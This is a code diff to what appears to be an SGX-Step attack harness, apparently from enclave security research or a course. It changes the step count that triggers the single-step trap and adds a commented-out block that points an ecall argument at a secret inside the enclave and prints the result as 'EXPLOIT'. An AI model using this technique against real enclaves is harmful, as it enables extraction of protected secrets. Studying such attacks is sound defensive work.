@@ -66,7 +66,7 @@ void aep_cb_func(void)
     
     
     //  0x208d
-    if(step_cnt == 35){
+    if(step_cnt == 11){
         info("testreach");
         sgx_step_do_trap = 0;
 
@@ -276,6 +276,28 @@ int main( int argc, char **argv )
     ecall_compute_response(eid,5,6);
     ecall_get_response(eid);
     */
+
+    /*
+    int sum = 1;
+    int prod = 2;
+
+    int* sump = &sum;
+    int* prodp = &prod;
+
+    struct my_struct ms2 = {sump, prodp};
+    void* encl_base_addr = get_enclave_base();
+    // TODO change address so 1 points to address of secret inside enclave
+    int* secret_addr = (int*) (encl_base_addr + 0x18000);
+
+    struct my_struct ms = {secret_addr, secret_addr};
+    
+
+    ecall_update_response_loc(eid, &ms);
+    ecall_compute_response(eid, 2, 4);
+    char buffer[64];  // must be large enough to hold the secret or error message
+    ecall_get_secret(eid, 8, buffer, sizeof(buffer));
+    printf("EXPLOIT: %s\n", buffer);*/
+
     /* 1. Setup attack execution environment. */
     register_symbols("./Enclave/encl.so");
     attacker_config_runtime();
